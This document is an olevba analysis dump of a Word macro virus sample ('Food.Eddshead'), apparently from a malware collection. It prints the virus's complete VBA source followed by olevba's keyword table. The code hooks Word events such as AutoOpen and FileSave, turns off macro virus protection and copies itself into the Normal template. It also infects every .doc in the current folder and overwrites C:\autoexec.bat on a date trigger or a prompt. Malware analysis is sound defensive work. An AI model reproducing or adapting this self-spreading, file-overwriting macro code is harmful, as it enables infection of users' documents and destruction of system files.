olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.VMPC-based-f244c5d5b712edcf19801711dd71ec229d91cd7f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.VMPC-based-f244c5d5b712edcf19801711dd71ec229d91cd7f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Edds.bas 
in file: Virus.MSWord.VMPC-based-f244c5d5b712edcf19801711dd71ec229d91cd7f - OLE stream: 'Macros/VBA/Edds'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
    
Public Skip As Integer
    
    '   Food.Eddshead Macro Virus
    '   Coded by Eddshead ;)
    '   29th May 1998 ENGLAND
    '   Watch out, the next one will format your hard drive!
    
Sub Edds()
 
On Error Resume Next
With Options
    .ConfirmConversions = False
    .VirusProtection = False
    .SaveNormalPrompt = False
End With
ActiveDocument.ReadOnlyRecommended = False
If Day(Now()) = 4 Then Call nasty("C:\autoexec.bat")
z4593895613 = 0
Set vx8956459313 = MacroContainer
If vx8956459313 = NormalTemplate Then z4593895613 = 1
If z4593895613 = 1 Then fuck45938 = NormalTemplate.FullName Else fuck45938 = ActiveDocument.FullName
If z4593895613 = 1 Then ki89561 = ActiveDocument.FullName Else ki89561 = NormalTemplate.FullName
Application.OrganizerCopy Source:=fuck45938, Destination:=ki89561, Name:="Edds", Object:=wdOrganizerObjectProjectItems
If z4593895613 = 1 And Skip <> 1 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
If z4593895613 = 0 Then
     If NormalTemplate.Saved = False Then NormalTemplate.Save
     End If

fuckoff:
End Sub
Sub FileNew()
    On Error Resume Next
    Call Edds
Dialogs(wdDialogFileNew).Show
    Skip = 1
    Call Edds
End Sub
Sub viewvbcode()
' no no no no no no !
End Sub
Sub FileSave()
    On Error Resume Next
    Call Edds
     ActiveDocument.Save
End Sub
Sub FileClose()
    On Error Resume Next
    Call Edds
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    ActiveDocument.Close
End Sub
Sub ToolsOptions()
    On Error Resume Next
    Dialogs(wdDialogToolsOptions).Show
    Call Edds
End Sub
Sub EditFind()
    On Error Resume Next
    Dialogs(wdDialogEditFind).Show
    Call Edds
End Sub
Sub FileSaveAs()
    On Error Resume Next
    Call execute
    Dialogs(wdDialogFileSaveAs).Show
    Call Edds
End Sub
Sub FilePrint()
    On Error Resume Next
Dialogs(wdDialogFilePrint).Show
    Call Edds
End Sub
Sub FileExit()
    On Error Resume Next
    Call Edds
    If ActiveDocument.Saved = False Then ActiveDocument.Save
Application.WindowState = wdWindowStateMinimize
pName = CurDir & "\"
fName = Dir(pName & "*.doc", sAttr)
If (fName <> "") And ((fName <> ".") And (fName <> "..")) Then InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
Call Edds
Do While (fName <> "")
fName = Dir()
If (fName <> "") And _
((fName <> ".") And (fName <> "..")) Then
InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
    Call Edds
End If
Loop
    Application.Quit
End Sub
Sub AutoOpen()
    On Error Resume Next
    Call Edds
End Sub
Sub AutoExit()
    On Error Resume Next
    Call Edds
Application.WindowState = wdWindowStateMinimize
pName = CurDir & "\"
fName = Dir(pName & "*.doc", sAttr)
If (fName <> "") And ((fName <> ".") And (fName <> "..")) Then InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
Call Edds
Do While (fName <> "")
fName = Dir()
If (fName <> "") And _
((fName <> ".") And (fName <> "..")) Then
InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
    Call Edds
End If
Loop
End Sub
Sub AutoExec()
    On Error Resume Next
    Call Edds
End Sub
Sub AutoClose()
    On Error Resume Next
    Call Edds
End Sub
Sub nasty(strfile As String)
Dim hfile As Long
    On Error Resume Next
part1$ = "This should be your Autoexec.bat file"
part2$ = "But now, I'm afraid, it's just a text file"
part3$ = "That will teach you to feed me with fish"
part4$ = "STOP ALL NUCLEAR TESTING IN THE THIRD WORLD"
hfile = FreeFile
Open strfile For Output Access Write As hfile
Print #hfile, part1$
Print #hfile, part2$
Print #hfile, part3$
Print #hfile, part4$
Close hfile
End Sub

Sub execute()
On Error Resume Next
Randomize
Check = Int(Rnd * 10)
If Check = 3 Then Call payloaded
Return

End Sub
Sub toolsmacro()
Randomize
Dim selector
selector = Int((5 * Rnd) + 1)
If selector = 1 Then
Application.Quit SaveChanges:=False
Else
Call Edds
End If
End Sub

Sub payloaded()
On Error Resume Next
Dim myvalue

myvalue = InputBox("Hello! I'm Food.Eddshead, and I am hungry! If you want to continual using Word you must feed me. Be careful, some foods make me ill, and you don't want to make me angry - do you?", "Your computer is hungry ;)")
    If myvalue = "chips" Then FileSaveAs: End
    If myvalue = "fish" Then Call nasty("C:\autoexec.bat")
    If myvalue = "sausages" Then Call nasty("C:\autoexec.bat")
    If myvalue = "beef burgers" Then Call nasty("C:\autoexec.bat")
    If myvalue = "ham burgers" Then Call nasty("C:\autoexec.bat")
Call payloaded
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
|IOC       |Autoexec.bat        |Executable file name                         |
|Base64    |~+!                 |fish                                         |
|String    |                    |                                             |
+----------+--------------------+---------------------------------------------+
